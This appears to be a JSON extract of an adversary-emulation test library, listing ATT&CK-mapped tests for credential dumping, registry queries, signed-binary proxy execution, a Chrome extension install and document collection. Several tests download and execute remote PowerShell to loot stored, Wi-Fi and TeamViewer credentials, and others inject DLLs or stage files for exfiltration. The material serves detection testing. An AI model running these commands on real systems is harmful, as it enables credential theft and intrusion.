[
    {
        "attack_technique": "T1555.004",
        "display_name": "Credentials from Password Stores: Windows Credential Manager",
        "atomic_tests": [
            {
                "name": "Access Saved Credentials via VaultCmd",
                "auto_generated_guid": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439",
                "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "command_prompt",
                    "elevation_required": false,
                    "command": "vaultcmd /listcreds:\"Windows Credentials\"\n"
                }
            },
            {
                "name": "WinPwn - Loot local Credentials - Invoke-WCMDump",
                "auto_generated_guid": "fa714db1-63dd-479e-a58e-7b2b52ca5997",
                "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1012",
        "display_name": "Query Registry",
        "atomic_tests": [
            {
                "name": "Query Registry",
                "auto_generated_guid": "8f7578c4-9863-4d83-875c-a565573bbdf0",
                "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n",
                    "name": "command_prompt",
                    "elevation_required": true
                }
            }
        ]
    },
    {
        "attack_technique": "T1555",
        "display_name": "Credentials from Password Stores",
        "atomic_tests": [
            {
                "name": "Extract Windows Credential Manager via VBA",
                "auto_generated_guid": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b",
                "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Microsoft Word must be installed\n",
                        "prereq_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                        "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                    }
                ],
                "executor": {
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
                    "cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
                "auto_generated_guid": "c89becbe-1758-4e7d-a0f4-97d2188a23e3",
                "description": "This module will extract the credentials from Windows Credential Manager",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
                }
            },
            {
                "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
                "auto_generated_guid": "8fd5a296-6772-4766-9991-ff4e92af7240",
                "description": "This module will extract the credentials from Windows Credential Manager",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n"
                }
            },
            {
                "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]",
                "auto_generated_guid": "36753ded-e5c4-4eb5-bc3c-e8fba236878d",
                "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "vaultcmd /listcreds:\"Windows Credentials\" /all\n"
                }
            },
            {
                "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]",
                "auto_generated_guid": "bc071188-459f-44d5-901a-f8f2625b2d2e",
                "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "vaultcmd /listcreds:\"Web Credentials\" /all\n"
                }
            },
            {
                "name": "WinPwn - Loot local Credentials - lazagne",
                "auto_generated_guid": "079ee2e9-6f16-47ca-a635-14efcd994118",
                "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - Loot local Credentials - Wifi Credentials",
                "auto_generated_guid": "afe369c2-b42e-447f-98a3-fb1f4e2b8552",
                "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords",
                "auto_generated_guid": "db965264-3117-4bad-b7b7-2523b7856b92",
                "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1218",
        "display_name": "Signed Binary Proxy Execution",
        "atomic_tests": [
            {
                "name": "mavinject - Inject DLL into running process",
                "auto_generated_guid": "c426dacf-575d-4937-8611-a148a86a5e61",
                "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "process_id": {
                        "description": "PID of process receiving injection",
                        "type": "String",
                        "default": "1000"
                    },
                    "dll_payload": {
                        "description": "DLL to inject",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
                        "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"
                    }
                ],
                "executor": {
                    "command": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\n",
                    "name": "command_prompt",
                    "elevation_required": true
                }
            },
            {
                "name": "Register-CimProvider - Execute evil dll",
                "auto_generated_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
                "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "dll_payload": {
                        "description": "DLL to execute",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
                        "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
                    }
                ],
                "executor": {
                    "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "InfDefaultInstall.exe .inf Execution",
                "auto_generated_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
                "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "inf_to_execute": {
                        "description": "Local location of inf file",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
                        "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
                    }
                ],
                "executor": {
                    "command": "InfDefaultInstall.exe #{inf_to_execute}\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "ProtocolHandler.exe Downloaded a Suspicious File",
                "auto_generated_guid": "db020456-125b-4c8b-a4a7-487df8afb5a2",
                "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "remote_url": {
                        "description": "url to document",
                        "type": "Url",
                        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Microsoft Word must be installed\n",
                        "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
                        "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                    }
                ],
                "executor": {
                    "name": "command_prompt",
                    "elevation_required": false,
                    "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n"
                }
            },
            {
                "name": "Microsoft.Workflow.Compiler.exe Payload Execution",
                "auto_generated_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e",
                "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "xml_payload": {
                        "description": "XML to execution",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
                    },
                    "mwcpath": {
                        "description": "Default location of Microsoft.Workflow.Compiler.exe",
                        "type": "Path",
                        "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
                    },
                    "mwcname": {
                        "description": "Default name of microsoft.workflow.compiler.exe",
                        "type": "Path",
                        "default": "microsoft.workflow.compiler.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": ".Net must be installed for this test to work correctly.\n",
                        "prereq_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "write-host \".Net must be installed for this test to work correctly.\"\n"
                    }
                ],
                "executor": {
                    "command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n",
                    "name": "powershell",
                    "elevation_required": false
                }
            },
            {
                "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
                "auto_generated_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911",
                "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "xml_payload": {
                        "description": "XML to execution",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
                    },
                    "renamed_binary": {
                        "description": "renamed Microsoft.Workflow.Compiler",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\svchost.exe"
                    },
                    "mwcpath": {
                        "description": "Default location of Microsoft.Workflow.Compiler.exe",
                        "type": "Path",
                        "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
                    },
                    "mwcname": {
                        "description": "Default name of microsoft.workflow.compiler.exe",
                        "type": "Path",
                        "default": "microsoft.workflow.compiler.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": ".Net must be installed for this test to work correctly.\n",
                        "prereq_command": "Copy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force\nif (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}\n",
                        "get_prereq_command": "write-host \"you need to rename workflow complier before you run this test\"\n"
                    }
                ],
                "executor": {
                    "command": "#{renamed_binary} #{xml_payload} output.txt\n",
                    "name": "powershell",
                    "elevation_required": false
                }
            },
            {
                "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
                "auto_generated_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db",
                "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "module_name": {
                        "description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.",
                        "type": "String",
                        "default": "foo"
                    },
                    "module_path": {
                        "description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.",
                        "type": "String",
                        "default": "$PWD"
                    }
                },
                "dependencies": [
                    {
                        "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.",
                        "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}",
                        "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                    }
                ],
                "executor": {
                    "command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}",
                    "name": "powershell"
                }
            },
            {
                "name": "DiskShadow Command Execution",
                "auto_generated_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa",
                "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "txt_payload": {
                        "description": "txt to execute",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\T1218.txt"
                    },
                    "dspath": {
                        "description": "Default location of DiskShadow.exe",
                        "type": "Path",
                        "default": "C:\\Windows\\System32\\diskshadow.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "txt file must exist on disk at specified location (#{txt_payload})",
                        "prereq_command": "if (Test-Path #{txt_payload}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{txt_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\"\n"
                    },
                    {
                        "description": "DiskShadow.exe must exist on disk at specified location (#{dspath})",
                        "prereq_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "echo \"DiskShadow.exe not found on disk at expected location\"\n"
                    }
                ],
                "executor": {
                    "command": "#{dspath} -S #{txt_payload} \n",
                    "name": "powershell",
                    "elevation_required": false
                }
            },
            {
                "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
                "auto_generated_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8",
                "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "arbitrary_dll": {
                        "description": "Path of DLL to be loaded",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
                        "prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{arbitrary_dll}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"
                    }
                ],
                "executor": {
                    "command": "wuauclt.exe /UpdateDeploymentProvider #{arbitrary_dll} /RunHandlerComServer\n",
                    "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Lolbin Gpscript logon option",
                "auto_generated_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c",
                "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "Gpscript /logon\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Lolbin Gpscript startup option",
                "auto_generated_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3",
                "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "Gpscript /startup\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Lolbas ie4uinit.exe use as proxy",
                "auto_generated_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
                "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "Path_inf": {
                        "description": "Path to the cab file",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"
                    },
                    "Path_ie4uinit": {
                        "description": "Path to ie4uinit.exe",
                        "type": "Path",
                        "default": "c:\\windows\\system32\\ie4uinit.exe"
                    }
                },
                "executor": {
                    "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy #{Path_inf} %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
                    "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n",
                    "name": "command_prompt"
                }
            }
        ]
    },
    {
        "attack_technique": "T1133",
        "display_name": "External Remote Services",
        "atomic_tests": [
            {
                "name": "Running Chrome VPN Extensions via the Registry 2 vpn extension",
                "auto_generated_guid": "4c8db261-a58b-42a6-a866-0a294deedde4",
                "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "chrome_url": {
                        "description": "chrome installer download URL",
                        "type": "Url",
                        "default": "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe"
                    },
                    "extension_id": {
                        "description": "chrome extension id",
                        "type": "String",
                        "default": "\"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Chrome must be installed\n",
                        "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
                        "get_prereq_command": "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": true,
                    "command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n",
                    "cleanup_command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\nRemove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}\n"
                }
            }
        ]
    },
    {
        "attack_technique": "T1119",
        "display_name": "Automated Collection",
        "atomic_tests": [
            {
                "name": "Automated Collection Command Prompt",
                "auto_generated_guid": "cb379146-53f1-43e0-b884-7ce2c635ff5b",
                "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection\n",
                    "cleanup_command": "del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Automated Collection PowerShell",
                "auto_generated_guid": "634bd9b9-dc83-4229-b19f-7f83ba9ad313",
                "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n",
                    "cleanup_command": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Recon information for export with PowerShell",
                "auto_generated_guid": "c3f6d794-50dd-482f-b640-0384fbb7db26",
                "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n",
                    "cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Recon information for export with Command Prompt",
                "auto_generated_guid": "aa1180e2-f329-4e1e-8625-2472ec0bfaf3",
                "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n",
                    "cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1\n",
